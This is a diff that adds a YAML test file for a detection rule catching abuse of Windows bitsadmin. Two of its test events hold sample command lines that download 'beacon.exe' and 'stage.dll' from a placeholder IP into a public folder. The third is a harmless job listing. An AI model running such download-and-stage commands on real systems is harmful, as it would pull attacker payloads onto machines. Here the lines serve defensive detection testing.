@@ -1,0 +1,23 @@
+rule: rule.yml
+
+cases:
+  - name: bitsadmin transfer download fires
+    event:
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: 'bitsadmin.exe /transfer updater /download /priority high http://203.0.113.15/beacon.exe C:\Users\Public\beacon.exe'
+    match: true
+    selections:
+      - selection_img
+      - selection_transfer
+
+  - name: bitsadmin addfile staging fires
+    event:
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: 'bitsadmin.exe -addfile stage http://203.0.113.15/stage.dll C:\Users\Public\stage.dll'
+    match: true
+
+  - name: bitsadmin listing jobs is benign
+    event:
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: 'bitsadmin.exe /list /allusers /verbose'
+    match: false
